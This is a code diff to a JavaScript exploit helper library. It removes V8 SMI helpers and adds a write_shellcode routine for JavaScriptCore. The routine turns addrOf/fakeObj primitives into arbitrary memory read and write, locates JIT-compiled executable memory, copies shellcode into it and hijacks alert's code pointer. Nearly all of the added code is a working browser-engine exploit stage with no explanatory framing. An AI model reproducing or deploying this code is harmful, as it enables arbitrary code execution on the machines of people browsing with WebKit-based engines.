@@ -249,30 +249,6 @@ Int64.shiftLeft = (a, b) => {
     return res.shift_left_inplace(b);
 }
 
-// Return an integer encoded as a V8 SMI
-// 0x4142434 -> 0x4142434400000000
-Int64.V8_to_SMI = (a) => {
-    if (a.high !== 0)
-        throw("Cannot make into SMI: " + a.toString());
-    return new Int64(undefined, a.low, 0);
-}
-
-// Return an encoded V8 SMI as an integer
-// 0x4142434400000000 -> 0x4142434 
-Int64.V8_from_SMI = (a) => {
-    if (a.low !== 0)
-        throw("Not encoded as an SMI: " + a.toString());
-    return new Int64(undefined, 0, a.high);
-}
-
-Int64.V8_tag = (a) => {
-    return new Int64(undefined, a.high, a.low|1);
-}
-
-Int64.V8_untag = (a) => {
-    return new Int64(undefined, a.high, a.low&0xfffffffe);
-}
-
 // Return a NaNboxed JSValue
 // This only makes sense for JavaScriptCore!
 Int64.JSC_as_JSValue = (a) => {
@@ -285,4 +261,166 @@ Int64.JSC_as_JSValue = (a) => {
     let res = Binary.i64_to_f64(a);
     a._add_inplace(0x20000, 0);
     return res;
+}
+
+function write_shellcode(addrOf, fakeObj, leaked_header, sc) {
+    let rwObj;
+    let rwObjBufferAddr;
+    let fakeRwObj;
+    let fakeInnerObj;
+
+    function read64(addr) {
+        for (let i = 0; i < 0x1000; i++) {
+            fakeRwObj[5] = Int64.to_double(Int64.sub(addr, 8 * i));
+            let value = fakeInnerObj[i];
+            if (value) {
+                return Int64.from_double(value);
+            }
+        }
+        throw '[-] Failed to read: ' + addr;
+    }
+
+    function write64(addr, value) {
+        fakeRwObj[5] = Int64.to_double(addr);
+        fakeInnerObj[0] = Int64.to_double(value);
+    }
+
+    function makeJITCompiledFunction() {
+        var obj = {};
+        function target(num) {
+            num ^= Math.random() * 10000;
+            num ^= 0x70000001;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000002;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000003;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000004;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000005;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000006;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000007;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000008;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000009;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000000a;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000000b;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000000c;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000000d;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000000e;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000000f;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000010;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000011;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000012;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000013;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000014;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000015;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000016;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000017;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000018;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000019;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000001a;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000001b;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000001c;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000001d;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000001e;
+            num ^= Math.random() * 10000;
+            num ^= 0x7000001f;
+            num ^= Math.random() * 10000;
+            num ^= 0x70000020;
+            num ^= Math.random() * 10000;
+            num &= 0xffff;
+            return num;
+        }
+
+        for (var i = 0; i < 1000; i++) {
+            target(i);
+        }
+        for (var i = 0; i < 1000; i++) {
+            target(i);
+        }
+        for (var i = 0; i < 1000; i++) {
+            target(i);
+        }
+
+        return target;
+    }
+        
+    function getJITCodeAddr(func) {
+        let funcAddr = addrOf(func);
+        let executableAddr = read64(Int64.add(funcAddr, 3 * 8));
+
+        let jitCodeAddr = read64(Int64.add(executableAddr, 3 * 8));
+
+        if (Int64.and(jitCodeAddr, new Int64('0xFFFF800000000000')).toString() != '0x0000000000000000' ||
+            Int64.and(Int64.sub(jitCodeAddr, new Int64('0x100000000')), new Int64('0x8000000000000000')).toString() != '0x0000000000000000') {
+            jitCodeAddr = Int64.add(Int64.shiftLeft(read64(Int64.add(executableAddr, 3 * 8 + 1)), 1), 0x100);
+        }
+
+        return jitCodeAddr;
+    }
+
+    function setJITCodeAddr(func, addr) {
+        let funcAddr = addrOf(func);
+        let executableAddr = read64(Int64.add(funcAddr, 3 * 8));
+        write64(Int64.add(executableAddr, 3 * 8), addr);
+        document.leakAddr(func);
+    }
+
+    function getJITFunction() {
+        let shellcodeFunc = makeJITCompiledFunction();
+        shellcodeFunc();
+        let jitCodeAddr = getJITCodeAddr(shellcodeFunc);
+        return [shellcodeFunc, jitCodeAddr];
+    }
+
+
+    rwObj = {
+        _: 1.1,
+        length: Int64.JSC_as_JSValue(0x4141414141414141),
+        id: Int64.JSC_as_JSValue(leaked_header),
+        butterfly: 1.1,
+
+        __: 1.1,
+        innerLength: Int64.JSC_as_JSValue(0x4141414141414141),
+        innerId: Int64.JSC_as_JSValue(leaked_header),
+        innerButterfly: 1.1,
+    };
+
+    rwObjBufferAddr = Int64.add(addrOf(rwObj), 0x20);
+    fakeRwObj = fakeObj(rwObjBufferAddr);   
+    rwObj.butterfly = fakeRwObj;
+    fakeInnerObj = fakeObj(Int64.add(rwObjBufferAddr, 0x20));
+    rwObj.innerButterfly = fakeInnerObj;
+
+    var [_JITFunc, rwxMemAddr] = getJITFunction();
+
+    for (let i = 0; i < sc.length; i++)
+        write64(Int64.add(rwxMemAddr, i), new Int64(sc[i]));
+    setJITCodeAddr(alert, rwxMemAddr);
+
 }
